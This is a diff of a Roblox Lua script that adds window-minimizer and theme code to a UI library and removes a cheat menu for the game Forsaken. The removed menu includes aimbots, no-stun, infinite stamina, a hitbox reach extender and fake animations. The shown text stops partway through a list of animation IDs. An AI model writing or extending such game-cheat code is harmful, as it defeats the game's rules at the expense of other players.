+			BackgroundTransparency = backgroundTransparency or 0,
+			AutoButtonColor = true,
+			ThemeTag = {
+				BackgroundColor3 = "Element",
+			},
+		}, {
+			New("UICorner", { CornerRadius = UDim.new(0, cornerRadius or (isDesktop and 14 or 12)) }),
+			New("UIStroke", {
+				ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+				Transparency = isDesktop and 0.6 or 0.7,
+				Thickness = isDesktop and 2 or 1.5,
+				ThemeTag = {
+					Color = "ElementBorder",
+				},
+			}),
+			New("ImageLabel", {
+				Name = "Icon",
+				Image = iconAsset,
+				Size = UDim2.new(0.8, 0, 0.8, 0),
+				Position = UDim2.new(0.5, 0, 0.5, 0),
+				AnchorPoint = Vector2.new(0.5, 0.5),
+				BackgroundTransparency = 1,
+				ThemeTag = {
+					ImageColor3 = "Text",
+				},
+			}, {
+				New("UIAspectRatioConstraint", { AspectRatio = 1, AspectType = Enum.AspectType.FitWithinMaxSize }),
+				New("UICorner", { CornerRadius = UDim.new(0, 0) })
+			}),
+
+		})
+	end
+
+	if isMobile then
+		holder = New("Frame", {
+			Name = "DoriHubMinimizer",
+			Parent = parentGui,
+			Size = Config.Size or UDim2.fromOffset(36, 36),
+			Position = Config.Position or UDim2.new(0.45, 0, 0.025, 0),
+			BackgroundTransparency = 1,
+			ZIndex = 999999999,
+			Visible = (Config.Visible ~= false),
+		})
 	else
-		-- 🛑 Dừng animation
-		if animTrack then
-			animTrack:Stop()
-			animTrack:Destroy()
-			animTrack = nil
+		holder = New("Frame", {
+			Name = "DoriHubMinimizer",
+			Parent = parentGui,
+			Size = Config.Size or UDim2.fromOffset(36, 36),
+			Position = Config.Position or UDim2.new(0, 300, 0, 20),
+			BackgroundTransparency = 1,
+			ZIndex = 999999999,
+			Visible = (Config.Visible ~= false),
+		})
+	end
+
+	if useAcrylic then
+		local miniAcrylic = Acrylic.AcrylicPaint()
+		miniAcrylic.Frame.Parent = holder
+		miniAcrylic.Frame.Size = UDim2.fromScale(1, 1)
+		pcall(function() miniAcrylic.AddParent(holder) end)
+
+		local desiredCorner = UDim.new(0, cornerRadius or 0)
+		pcall(function()
+			for _, descendant in ipairs(miniAcrylic.Frame:GetDescendants()) do
+				if descendant.ClassName == "UICorner" then
+					descendant.CornerRadius = desiredCorner
+				elseif descendant.ClassName == "ImageLabel" then
+					descendant.Size = UDim2.fromScale(1, 1)
+					descendant.Position = UDim2.new(0.5, 0, 0.5, 0)
+					descendant.AnchorPoint = Vector2.new(0.5, 0.5)
+				end
+			end
+		end)
+		self.MinimizerAcrylic = miniAcrylic
+	end
+
+	local btnInstance = createButton(not isMobile)
+	btnInstance.Parent = holder
+	btnInstance.ZIndex = (holder.ZIndex or 0) + 1
+
+	local button = holder:FindFirstChildOfClass("TextButton")
+	if button then
+		local isDragging = false
+		local dragStart, dragOffset
+
+		if draggableWhole then
+			Creator.AddSignal(button.InputBegan, function(Input)
+				if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
+					isDragging = true
+					local pos = Input.Position
+					dragStart = Vector2.new(pos.X, pos.Y)
+					dragOffset = holder.Position
+					local conn
+					conn = Input.Changed:Connect(function()
+						if Input.UserInputState == Enum.UserInputState.End then
+							isDragging = false
+							dragStart = nil
+							dragOffset = nil
+							conn:Disconnect()
+						end
+					end)
+				end
+			end)
+
+			Creator.AddSignal(RunService.Heartbeat, function()
+				if isDragging and dragStart and dragOffset and holder and holder.Parent then
+					local mouse = LocalPlayer:GetMouse()
+					local current = Vector2.new(mouse.X, mouse.Y)
+					local delta = current - dragStart
+					local newX = dragOffset.X.Offset + delta.X
+					local newY = dragOffset.Y.Offset + delta.Y
+					local viewport = workspace.Camera.ViewportSize
+					local size = holder.AbsoluteSize
+					if newX < 0 then newX = 0 end
+					if newY < 0 then newY = 0 end
+					if newX > viewport.X - size.X then newX = viewport.X - size.X end
+					if newY > viewport.Y - size.Y then newY = viewport.Y - size.Y end
+					holder.Position = UDim2.new(0, newX, 0, newY)
+				end
+			end)
 		end
 
-		-- 🧹 Xóa hiệu ứng chữ
-		local f = player.PlayerGui:FindFirstChild(folderName)
-		if f then
-			for _, v in ipairs(f:GetChildren()) do
-				v:Destroy()
+		AddSignal(button.MouseButton1Click, function()
+			task.wait(0.1)
+			if not isDragging and Library.Window then
+				Library.Window:Minimize()
+			end
+		end)
+	end
+
+
+
+	self.Minimizer = holder
+	return holder
+end
+
+function Library:SetTheme(Value)
+	if Library.Window and table.find(Library.Themes, Value) then
+		Library.Theme = Value
+		Creator.UpdateTheme()
+
+		if Value == "Glass" then
+			Library:SetWindowTransparency(0.9)
+		end
+	end
+end
+
+function Library:Destroy()
+	if Library.Window then
+		Library.Unloaded = true
+		if Library.UseAcrylic then
+			Library.Window.AcrylicPaint.Model:Destroy()
+		end
+		Creator.Disconnect()
+		Library.GUI:Destroy()
+	end
+end
+
+function Library:ToggleAcrylic(Value)
+	if Library.Window then
+		if Library.UseAcrylic then
+			Library.Acrylic = Value
+			if Library.Window.AcrylicPaint and Library.Window.AcrylicPaint.Model then
+				Library.Window.AcrylicPaint.Model.Transparency = Value and 0.95 or 1
 			end
 		end
 	end
 end
 
--- === GẮN VÀO UI (ví dụ Fluent) ===
-Tabs.Custom:AddToggle("FakeH4CK3R", {
-	Title = "Fake H4CK3R",
-	Default = false,
-	Callback = function(Value)
-		ToggleFakeHacker(Value)
+function Library:ToggleTransparency(Value)
+	if Library.Window then
+		Library.Window.AcrylicPaint.Frame.Background.BackgroundTransparency = Value and 0.35 or 0
 	end
-})
+end
+function Library:SetWindowTransparency(Value)
+	if Library.Window and Library.UseAcrylic then
+		Value = math.clamp(Value, 0, 3)
 
+		if Library.Theme == "Glass" then
+			local glassTransparency = 0.8 + (Value * 0.05)
+			if Value > 1 then
+				glassTransparency = 0.85 + ((Value - 1) * 0.04)
+			end
+			if Value > 2 then
+				glassTransparency = 0.93 + ((Value - 2) * 0.04)
+			end
+			Library.Window.AcrylicPaint.Model.Transparency = math.min(glassTransparency, 0.99)
 
--- Tabs.Player
+			local backgroundTransparency = 0.7 + (Value * 0.08)
+			if Value > 1 then
+				backgroundTransparency = 0.78 + ((Value - 1) * 0.07)
+			end
+			if Value > 2 then
+				backgroundTransparency = 0.85 + ((Value - 2) * 0.1)
+			end
+			Library.Window.AcrylicPaint.Frame.Background.BackgroundTransparency = math.min(backgroundTransparency, 0.99)
 
+			Library.NotificationTransparency = Value
 
-
--- ======= DỊCH VỤ =======
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
-
--- ======= WHITELIST =======
-local AllowedPlayers = {
-    ["Noob"] = true, ["Guest1337"] = true, ["Elliot"] = true,
-    ["Shedletsky"] = true, ["TwoTime"] = true, ["007n7"] = true,
-    ["Chance"] = true, ["Builderman"] = true, ["Taph"] = true,
-    ["Dusekkar"] = true, ["Veeronica"] = true,
-}
-
-local AllowedKillers = {
-    ["Slasher"] = true, ["1x1x1x1"] = true, ["c00lkidd"] = true,
-    ["Noli"] = true, ["JohnDoe"] = true, ["Guest 666"] = true,
-    ["Sixer"] = true,
-}
-
--- ======= BIẾN TRẠNG THÁI =======
-local AimlockPlayerEnabled = false
-local AimlockKillerEnabled = false
-local CurrentTarget = nil
-local lastHumanoidAutoRotate = nil
-
--- ======= HÀM HỖ TRỢ =======
-local function IsAllowed(model, list)
-    return list[model.Name] == true
+			for _, notification in pairs(Library.ActiveNotifications or {}) do
+				if notification and notification.ApplyTransparency then
+					notification:ApplyTransparency()
+				end
+			end
+		else
+			Library.Window.AcrylicPaint.Model.Transparency = 0.98
+			Library.Window.AcrylicPaint.Frame.Background.BackgroundTransparency = Value * 0.3
+		end
+	end
 end
 
-local function GetModelFromPlayer(plr, list)
-    if not plr.Character then return nil end
-    if IsAllowed(plr.Character, list) and plr.Character:FindFirstChildWhichIsA("Humanoid") then
-        return plr.Character
-    end
-    for _, model in ipairs(workspace:GetChildren()) do
-        if model:IsA("Model") and model:FindFirstChildWhichIsA("Humanoid") then
-            if model:FindFirstChild("Owner") and model.Owner.Value == plr then
-                if IsAllowed(model, list) then
-                    return model
-                end
-            end
-        end
-    end
-    return nil
+function Library:Notify(Config)
+	return NotificationModule:New(Config)
 end
 
-local function GetClosestTarget(list)
-    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if not myRoot then return nil end
-    local closest, dist = nil, math.huge
-
-    for _, plr in ipairs(Players:GetPlayers()) do
-        if plr ~= LocalPlayer then
-            local model = GetModelFromPlayer(plr, list)
-            if model and model.PrimaryPart then
-                local humanoid = model:FindFirstChildWhichIsA("Humanoid")
-                if humanoid and humanoid.Health > 0 then
-                    local distance = (model.PrimaryPart.Position - myRoot.Position).Magnitude
-                    if distance < dist then
-                        dist = distance
-                        closest = model
-                    end
-                end
-            end
-        end
-    end
-    return closest
-end
-
-local function ValidateTarget(target)
-    if not target then return false end
-    local humanoid = target:FindFirstChildWhichIsA("Humanoid")
-    return humanoid and humanoid.Health > 0 and target.PrimaryPart ~= nil
-end
-
--- reset khi respawn
-LocalPlayer.CharacterAdded:Connect(function(char)
-    CurrentTarget = nil
-    if lastHumanoidAutoRotate ~= nil then
-        local hum = char:FindFirstChildWhichIsA("Humanoid")
-        if hum then
-            hum.AutoRotate = lastHumanoidAutoRotate
-        end
-        lastHumanoidAutoRotate = nil
-    end
-end)
-
--- ======= AIMBOT LOOP (fix: hướng đúng, không bị đen màn hình) =======
-RunService.RenderStepped:Connect(function()
-    local myChar = LocalPlayer.Character
-    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
-    local humanoid = myChar and myChar:FindFirstChildWhichIsA("Humanoid")
-
-    if not myRoot then return end
-
-    -- toggle AutoRotate
-    if (AimlockPlayerEnabled or AimlockKillerEnabled) and humanoid then
-        if lastHumanoidAutoRotate == nil then
-            lastHumanoidAutoRotate = humanoid.AutoRotate
-        end
-        humanoid.AutoRotate = false
-    elseif humanoid and lastHumanoidAutoRotate ~= nil then
-        humanoid.AutoRotate = lastHumanoidAutoRotate
-        lastHumanoidAutoRotate = nil
-    end
-
-    -- hàm xoay nhìn target (fix: dùng lookVector:Cross(up) để rightVector đúng)
-    local function faceTarget(target)
-        if not target or not target.PrimaryPart then return end
-        local pos = myRoot.Position
-        local targetPos = target.PrimaryPart.Position
-        local dir = Vector3.new(targetPos.X, pos.Y, targetPos.Z) - pos
-        if dir.Magnitude == 0 then return end
-
-        local lookVector = dir.Unit
-        local up = Vector3.yAxis
-        local rightVector = lookVector:Cross(up) -- CHỈNH: right = look x up (không ngược)
-        if rightVector.Magnitude == 0 then
-            rightVector = Vector3.new(1, 0, 0)
-        else
-            rightVector = rightVector.Unit
-        end
-
-        -- fromMatrix(position, rightVector, up) — chỉ thay orientation, giữ nguyên vị trí
-        myRoot.CFrame = CFrame.fromMatrix(pos, rightVector, up)
-    end
-
-    if AimlockPlayerEnabled then
-        if not ValidateTarget(CurrentTarget) then
-            CurrentTarget = GetClosestTarget(AllowedPlayers)
-        end
-        if ValidateTarget(CurrentTarget) then
-            faceTarget(CurrentTarget)
-        end
-    elseif AimlockKillerEnabled then
-        if not ValidateTarget(CurrentTarget) then
-            CurrentTarget = GetClosestTarget(AllowedKillers)
-        end
-        if ValidateTarget(CurrentTarget) then
-            faceTarget(CurrentTarget)
-        end
-    else
-        CurrentTarget = nil
-    end
-end)
-
--- ======= FLUENT TOGGLES =======
-Tabs.Player:AddToggle("ForsakenAimbot", {
-    Title = "Aimbot Player",
-    Default = false
-}):OnChanged(function(v)
-    AimlockPlayerEnabled = v
-    if v then 
-        AimlockKillerEnabled = false
-        CurrentTarget = nil
-    end
-end)
-
-Tabs.Player:AddToggle("ForsakenAimbot1", {
-    Title = "Aimbot Killer",
-    Default = false
-}):OnChanged(function(v)
-    AimlockKillerEnabled = v
-    if v then 
-        AimlockPlayerEnabled = false
-        CurrentTarget = nil
-    end
-end)
-
-
-
-
-
-
-    Tabs.Player:AddSection("Cheats")
-
-local ActiveNoStun = false
-local noStunLoop
-
-Tabs.Player:AddToggle("NoStunToggle", {
-    Title = "No Stun",
-    Default = false,
-}):OnChanged(function(value)
-    ActiveNoStun = value
-
-    if value then
-        -- Nếu có loop cũ thì dừng
-        if noStunLoop then
-            task.cancel(noStunLoop)
-            noStunLoop = nil
-        end
-
-        -- Tạo loop mới liên tục đảm bảo HumanoidRootPart không bị anchore
-        noStunLoop = task.spawn(function()
-            while ActiveNoStun do
-                local character = game.Players.LocalPlayer.Character
-                local hrp = character and character:FindFirstChild("HumanoidRootPart")
-                if hrp then
-                    hrp.Anchored = false
-                end
-                task.wait(0.1) -- Không cần quá nhanh, tránh lag
-            end
-        end)
-    else
-        -- Tắt loop khi toggle off
-        if noStunLoop then
-            task.cancel(noStunLoop)
-            noStunLoop = nil
-        end
-    end
-end)
-
-
-
-
-
-
-local InfStaminaEnabled = false  
-local staminaLoop  
-local StaminaModule  
-  
--- Thử lấy module an toàn  
-pcall(function()  
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")  
-    local path = ReplicatedStorage:FindFirstChild("Systems")  
-        and ReplicatedStorage.Systems:FindFirstChild("Character")  
-        and ReplicatedStorage.Systems.Character:FindFirstChild("Game")  
-        and ReplicatedStorage.Systems.Character.Game:FindFirstChild("Sprinting")  
-  
-    if path then  
-        StaminaModule = require(path)  
-    end  
-end)  
-  
--- Hàm hồi stamina an toàn  
-local function restoreStamina()  
-    if not StaminaModule then return end  
-
-    local maxStamina = StaminaModule.MaxStamina or 100  
-    if StaminaModule.Stamina then  
-        -- Nếu module có hàm "SetStamina" thì dùng  
-        if typeof(StaminaModule.SetStamina) == "function" then  
-            StaminaModule:SetStamina(maxStamina)  
-
-        -- Nếu có hàm "UpdateStamina" thì dùng  
-        elseif typeof(StaminaModule.UpdateStamina) == "function" then  
-            StaminaModule:UpdateStamina(maxStamina)  
-
-        -- Nếu không có thì set trực tiếp  
-        else  
-            StaminaModule.Stamina = maxStamina  
-        end  
-    end  
-end  
-  
--- Chỉ tạo toggle nếu module tồn tại  
-if StaminaModule then  
-    Tabs.Player:AddToggle("InfStamina", {  
-        Title = "Infinite Stamina",  
-        Default = false  
-    }):OnChanged(function(value)  
-        -- luôn bọc trong pcall để Fluent không báo "Callback error"  
-        local ok = pcall(function()  
-            InfStaminaEnabled = value  
-            if StaminaModule.StaminaLossDisabled ~= nil then  
-                StaminaModule.StaminaLossDisabled = value  
-            end  
-  
-            if value then  
-                restoreStamina()  
-                if not staminaLoop then  
-                    staminaLoop = task.spawn(function()  
-                        while InfStaminaEnabled do  
-                            task.wait(0.01)  
-                            restoreStamina()  
-                        end  
-                        staminaLoop = nil  
-                    end)  
-                end  
-            end  
-        end)  
-    end)  
-else  
-end
-
-
-
-
-Tabs.Player:AddToggle("InfiniteZoom", {
-    Title = "Infinite Zoom",
-    Default = false,
-    Callback = function(Value)
-        local player = game.Players.LocalPlayer
-        local camera = workspace.CurrentCamera
-
-        if Value then
-            -- Bật zoom vô hạn
-            player.CameraMaxZoomDistance = math.huge
-            player.CameraMinZoomDistance = 0.5
-        else
-            -- Tắt zoom vô hạn, trở lại bình thường
-            player.CameraMaxZoomDistance = 128
-            player.CameraMinZoomDistance = 0.5
-        end
-    end
-})
-
-
-
-    Tabs.Player:AddSection("Troller")
-
-
-
-
-Tabs.Player:AddButton({
-    Title = "Fake Block",
-    Callback = function()
-        -- Tạo Animation object
-        local animation = Instance.new("Animation")
-        animation.AnimationId = "rbxassetid://72722244508749"
-
-        -- Lấy Humanoid của nhân vật
-        local player = game.Players.LocalPlayer
-        local character = player.Character or player.CharacterAdded:Wait()
-        local humanoid = character:FindFirstChildOfClass("Humanoid")
-
-        if humanoid then
-            local animator = humanoid:FindFirstChildOfClass("Animator")
-            if not animator then
-                animator = Instance.new("Animator")
-                animator.Parent = humanoid
-            end
-
-            -- Load và Play animation
-            local animTrack = animator:LoadAnimation(animation)
-            animTrack:Play()
-        end
-    end
-})
-
-
-
-Tabs.Player:AddButton({
-    Title = "Fake Punch",
-    Callback = function()
-        -- Tạo Animation object
-        local animation = Instance.new("Animation")
-        animation.AnimationId = "rbxassetid://87259391926321"
-
-        -- Lấy Humanoid của nhân vật
-        local player = game.Players.LocalPlayer
-        local character = player.Character or player.CharacterAdded:Wait()
-        local humanoid = character:FindFirstChildOfClass("Humanoid")
-
-        if humanoid then
-            local animator = humanoid:FindFirstChildOfClass("Animator")
-            if not animator then
-                animator = Instance.new("Animator")
-                animator.Parent = humanoid
-            end
-
-            -- Load và Play animation
-            local animTrack = animator:LoadAnimation(animation)
-            animTrack:Play()
-        end
-
-        -- Âm thanh đầu tiên
-        local sound1 = Instance.new("Sound")
-        sound1.SoundId = "rbxassetid://81976396729343"
-        sound1.Parent = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
-        sound1:Play()
-
-        -- Sau 0.75 giây thì tắt sound1 và phát sound2
-        task.delay(0.75, function()
-            if sound1.IsPlaying then
-                sound1:Stop()
-            end
-            local sound2 = Instance.new("Sound")
-            sound2.SoundId = "rbxassetid://122560631718612"
-            sound2.Parent = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
-            sound2:Play()
-        end)
-    end
-})
-
-
-
-
-Tabs.Player:AddButton({
-    Title = "Fake Punch v2",
-    Callback = function()
-        -- Tạo Animation object
-        local animation = Instance.new("Animation")
-        animation.AnimationId = "rbxassetid://86709774283672"
-
-        -- Lấy Humanoid của nhân vật
-        local player = game.Players.LocalPlayer
-        local character = player.Character or player.CharacterAdded:Wait()
-        local humanoid = character:FindFirstChildOfClass("Humanoid")
-
-        if humanoid then
-            local animator = humanoid:FindFirstChildOfClass("Animator")
-            if not animator then
-                animator = Instance.new("Animator")
-                animator.Parent = humanoid
-            end
-
-            -- Load và Play animation
-            local animTrack = animator:LoadAnimation(animation)
-            animTrack:Play()
-        end
-
-        -- Âm thanh đầu tiên
-        local sound1 = Instance.new("Sound")
-        sound1.SoundId = "rbxassetid://81976396729343"
-        sound1.Parent = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
-        sound1:Play()
-
-        -- Sau 0.5 giây thì tắt sound1 và phát sound2
-        task.delay(0.5, function()
-            if sound1.IsPlaying then
-                sound1:Stop()
-            end
-            local sound2 = Instance.new("Sound")
-            sound2.SoundId = "rbxassetid://122560631718612"
-            sound2.Parent = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
-            sound2:Play()
-        end)
-    end
-})
-
-
-
-do
--- Lưu callback Backflip để toggle gọi lại
-local function doBackflip()
-    local plr = game.Players.LocalPlayer
-    local char = plr and plr.Character
-    if not char then return end
-
-    local hum = char:FindFirstChild("Humanoid")
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    local animator = hum and hum:FindFirstChildOfClass("Animator")
-    if not (hum and hrp) then return end
-
-    if char:FindFirstChild("Animate") then
-        char.Animate.Disabled = true
-    end
-
-    if animator then
-        for _, v in ipairs(animator:GetPlayingAnimationTracks()) do
-            v:Stop()
-        end
-    end
-
-    for _, s in ipairs({
-        Enum.HumanoidStateType.FallingDown,
-        Enum.HumanoidStateType.Freefall,
-        Enum.HumanoidStateType.Running,
-        Enum.HumanoidStateType.Seated,
-        Enum.HumanoidStateType.Climbing
-    }) do
-        hum:SetStateEnabled(s, false)
-    end
-    hum:ChangeState(Enum.HumanoidStateType.Physics)
-
-    local d, s = 0.45, 120
-    local cf = hrp.CFrame
-    local dir = cf.LookVector -- ✅ bay theo hướng nhìn
-    local up = Vector3.yAxis
-
-    task.spawn(function()
-        local t0 = tick()
-        for i = 1, s do
-            local t = i / s
-            local y = 4 * (t - t ^ 2) * 10
-            local targetPos = cf.Position + dir * (35 * t) + up * y
-            local r = CFrame.Angles(math.rad(360 * t), 0, 0)
-
-            -- ✅ Raycast check trước khi PivotTo
-            local rayParams = RaycastParams.new()
-            rayParams.FilterDescendantsInstances = {char}
-            rayParams.FilterType = Enum.RaycastFilterType.Blacklist
-
-            local result = workspace:Raycast(hrp.Position, (targetPos - hrp.Position), rayParams)
-
-            if result then
-                -- Nếu có tường chặn → dừng tại vị trí va chạm
-                targetPos = result.Position + result.Normal * 2
-            end
-
-            char:PivotTo(CFrame.new(targetPos) * cf.Rotation * r)
-
-            local wt = (d / s) * i - (tick() - t0)
-            if wt > 0 then task.wait(wt) end
-        end
-
-        -- Kiểm tra va chạm tại điểm kết thúc
-        local finalTarget = cf.Position + dir * 35
-        local rayParams = RaycastParams.new()
-        rayParams.FilterDescendantsInstances = {char}
-        rayParams.FilterType = Enum.RaycastFilterType.Blacklist
-        local result = workspace:Raycast(hrp.Position, (finalTarget - hrp.Position), rayParams)
-        if result then
-            finalTarget = result.Position + result.Normal * 2
-        end
-
-        char:PivotTo(CFrame.new(finalTarget) * cf.Rotation)
-
-        for _, s in ipairs({
-            Enum.HumanoidStateType.FallingDown,
-            Enum.HumanoidStateType.Freefall,
-            Enum.HumanoidStateType.Running,
-            Enum.HumanoidStateType.Seated,
-            Enum.HumanoidStateType.Climbing
-        }) do
-            hum:SetStateEnabled(s, true)
-        end
-        hum:ChangeState(Enum.HumanoidStateType.Running)
-        char.Animate.Disabled = false
-    end)
-end
-
--- Nút Backflip
-Tabs.Player:AddButton({
-    Title = "Backflip",
-    -- Description = "Perform a backflip",
-    Callback = doBackflip
-})
-
--- Toggle Auto Backflip
-local autoFlip = false
-Tabs.Player:AddToggle("AutoBackflip", {
-    Title = "Auto Backflip",
-    Default = false,
-    Callback = function(Value)
-        autoFlip = Value
-        if autoFlip then
-            task.spawn(function()
-                while autoFlip do
-                    doBackflip()
-                    task.wait(1.25)
-                end
-            end)
-        end
-    end
-})
-end
-
-
-
-
-
-
-
-
-
-
-do
-    local Players = game:GetService("Players")
-    local player = Players.LocalPlayer
-
-    -- Animation object
-    local fakeFixAnim = Instance.new("Animation")
-    fakeFixAnim.AnimationId = "rbxassetid://82691533602949"
-
-    local animator, fakeFixTrack
-
-    -- Hàm tìm animator của nhân vật
-    local function getAnimator()
-        local char = player.Character
-        if not char then return nil end
-        local humanoid = char:FindFirstChildOfClass("Humanoid") or char:FindFirstChildOfClass("AnimationController")
-        if not humanoid then return nil end
-        local anim = humanoid:FindFirstChildOfClass("Animator")
-        if not anim then
-            anim = Instance.new("Animator")
-            anim.Parent = humanoid
-        end
-        return anim
-    end
-
-    -- Toggle UI
-    Tabs.Player:AddToggle("FakeFixGen", {
-        Title = "Fake Fix Gen",
-        Default = false,
-        Callback = function(state)
-            animator = getAnimator()
-            if not animator then return end
-
-            if state then
-                if not fakeFixTrack then
-                    local ok, track = pcall(function()
-                        return animator:LoadAnimation(fakeFixAnim)
-                    end)
-                    if ok and track then
-                        fakeFixTrack = track
-                        fakeFixTrack.Looped = true
-                        fakeFixTrack:Play()
-                    end
-                end
-            else
-                if fakeFixTrack then
-                    fakeFixTrack:Stop()
-                    fakeFixTrack = nil
-                end
-            end
-        end
-    })
-end
-
-
-
-
-do
--- Fake Die Toggle (start at 50%, stop at 90%)
-Tabs.Player:AddToggle("FakeDieV2", {
-    Title = "Fake Die V2",
-    Default = false
-}):OnChanged(function(state)
-    local Players = game:GetService("Players")
-    local RunService = game:GetService("RunService")
-
-    local plr = Players.LocalPlayer
-    local char = plr.Character or plr.CharacterAdded:Wait()
-    local hum = char:WaitForChild("Humanoid")
-
-    if not getgenv().FakeDieData then
-        getgenv().FakeDieData = {track=nil, conn=nil}
-    end
-
-    if state then
-        -- === BẬT Fake Die ===
-        local anim = Instance.new("Animation")
-        anim.AnimationId = "rbxassetid://118795597134269"
-
-        local track = hum:LoadAnimation(anim)
-        track:Play()
-
-        -- Nhảy thẳng đến 50%
-        if track.Length > 0 then
-            track.TimePosition = track.Length * 0.5
-        end
-
-        getgenv().FakeDieData.track = track
-
-        local stopped = false
-        local conn = RunService.Heartbeat:Connect(function()
-            if track.IsPlaying and not stopped and track.Length > 0 then
-                local percent = track.TimePosition / track.Length
-                if percent >= 0.9 then
-                    track:AdjustSpeed(0) -- pause ở 90%
-                    stopped = true
-                end
-            end
-        end)
-
-        getgenv().FakeDieData.conn = conn
-
-    else
-        -- === TẮT Fake Die ===
-        local data = getgenv().FakeDieData
-        if data.track then
-            data.track:Stop()
-            data.track = nil
-        end
-        if data.conn then
-            data.conn:Disconnect()
-            data.conn = nil
-        end
-
-        -- Khôi phục animation mặc định (idle)
-        pcall(function()
-            hum:PlayEmote("idle")
-        end)
-    end
-end)
-end
-
-
-
-
-
-    Tabs.Player:AddSection("Hitbox")
-
-
-repeat task.wait() until game:IsLoaded()
-
--- biến cấu hình
-local ForsakenReachEnabled = false
-local NearestDist = 120
-
--- thêm toggle + slider vào Fluent (Tabs.Player bạn đã có sẵn)
-Tabs.Player:AddToggle("ForsakenReachToggle", {
-    Title = "Hitbox Devil",
-    Default = false,
-    Save = true
-}):OnChanged(function(Value)
-    ForsakenReachEnabled = Value
-end)
-
-Tabs.Player:AddSlider("ForsakenReachSlider", {
-    Title = "Distance",
-    Default = 120,
-    Min = 10,
-    Max = 300,
-    Rounding = 0,
-    Save = true,
-    Suffix = " studs"
-}):OnChanged(function(Value)
-    NearestDist = Value
-end)
-
--- services & player setup
-local Players = game:GetService('Players')
-local Player = Players.LocalPlayer
-local Character = Player.Character or Player.CharacterAdded:Wait()
-local Humanoid = Character:WaitForChild("Humanoid")
-local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
-
-Player.CharacterAdded:Connect(function(NewCharacter)
-    Character = NewCharacter
-    Humanoid = Character:WaitForChild("Humanoid")
-    HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
-end)
-
-local RNG = Random.new()
-
--- full danh sách animations giữ nguyên từ code 1
-local AttackAnimations = {
-    'rbxassetid://131430497821198',
-    'rbxassetid://83829782357897',
-    'rbxassetid://126830014841198',
-    'rbxassetid://126355327951215',
-    'rbxassetid://121086746534252',
-    'rbxassetid://105458270463374',
-    'rbxassetid://127172483138092',
-    'rbxassetid://18885919947',
-    'rbxassetid://18885909645',
-    'rbxassetid://87259391926321',
-    'rbxassetid://106014898528300',
-    'rbxassetid://87259391926321',
-    'rbxassetid://86545133269813',
-    'rbxassetid://89448354637442',
-    'rbxassetid://90499469533503',
-    'rbxassetid://116618003477002',
-    'rbxassetid://106086955212611',
-    'rbxassetid://107640065977686',
-    'rbxassetid://77124578197357',
-    'rbxassetid://101771617803133',
-    'rbxassetid://134958187822107',
-    'rbxassetid://111313169447787',
-    'rbxassetid://71685573690338',
-    'rbxassetid://129843313690921',
-    'rbxassetid://97623143664485',
-    'rbxassetid://129843313690921',
-    'rbxassetid://136007065400978',
-    'rbxassetid://136007065400978',
-    'rbxassetid://86096387000557',
-    'rbxassetid://108807732150251',
-    'rbxassetid://138040001965654',
-    'rbxassetid://73502073176819',
-    'rbxassetid://129843313690921',
-    'rbxassetid://97623143664485',
-    'rbxassetid://129843313690921',
-    'rbxassetid://97623143664485',
-    'rbxassetid://86709774283672',
-    'rbxassetid://106014898528300',
-    'rbxassetid://87259391926321',
-    'rbxassetid://140703210927645',
-    'rbxassetid://96173857867228',
-    'rbxassetid://121255898612475',
-    'rbxassetid://98031287364865',
-    'rbxassetid://119462383658044',
-    'rbxassetid://77448521277146',
-    'rbxassetid://77448521277146',
-    'rbxassetid://103741352379819',
-    'rbxassetid://119462383658044',
-    'rbxassetid://131696603025265',
-    'rbxassetid://122503338277352',
-    'rbxassetid://97648548303678',
-    'rbxassetid://94162446513587',
-    'rbxassetid://84426150435898',
-    'rbxassetid://93069721274110',
-    'rbxassetid://114620047310688',
-    'rbxassetid://97433060861952',
-    'rbxassetid://82183356141401',
-    'rbxassetid://100592913030351',
-    'rbxassetid://121293883585738',
-    'rbxassetid://100592913030351',
-    'rbxassetid://121293883585738',
-    'rbxassetid://100592913030351',
-    'rbxassetid://121293883585738',
-    'rbxassetid://70447634862911',
-    'rbxassetid://92173139187970',
-    'rbxassetid://106847695270773',
-    'rbxassetid://125403313786645',
-    'rbxassetid://81639435858902',
-    'rbxassetid://137314737492715',
-    'rbxassetid://120112897026015',
-    'rbxassetid://82113744478546',
-    'rbxassetid://118298475669935',
-    'rbxassetid://82113744478546',
-    'rbxassetid://118298475669935',
-    'rbxassetid://126681776859538',
-    'rbxassetid://129976080405072',
-    'rbxassetid://109667959938617',
-    'rbxassetid://74707328554358',
-    'rbxassetid://133336594357903',
-    'rbxassetid://86204001129974',
-    'rbxassetid://82113744478546',
-    'rbxassetid://118298475669935',
-    'rbxassetid://124243639579224',
-    'rbxassetid://70371667919898',
-    'rbxassetid://131543461321709',
-    'rbxassetid://136323728355613',
-    'rbxassetid://109230267448394',
-    'rbxassetid://139835501033932',
-    'rbxassetid://106538427162796',
-    'rbxassetid://109667959938617',
-    'rbxassetid://126681776859538',
-    'rbxassetid://129976080405072',
-    'rbxassetid://110400453990786',
-    'rbxassetid://83685305553364',
-    'rbxassetid://126171487400618',
-    'rbxassetid://122709416391891',
-    'rbxassetid://87989533095285',
-    'rbxassetid://119326397274934',
-    'rbxassetid://140365014326125',
-    'rbxassetid://139309647473555',
-    'rbxassetid://133363345661032',
-    'rbxassetid://128414736976503',
-    'rbxassetid://121808371053483',
-    'rbxassetid://77375846492436',
-    'rbxassetid://92445608014276',
-    'rbxassetid://100358581940485',
-    'rbxassetid://91758760621955',
-    'rbxassetid://94634594529334',
-    'rbxassetid://101101433684051',
-    'rbxassetid://90620531468240',
-    'rbxassetid://94958041603347',
-    'rbxassetid://131642454238375',
-    'rbxassetid://110702884830060',
-    'rbxassetid://76312020299624',
-    'rbxassetid://126654961540956',
-    'rbxassetid://139613699193400',
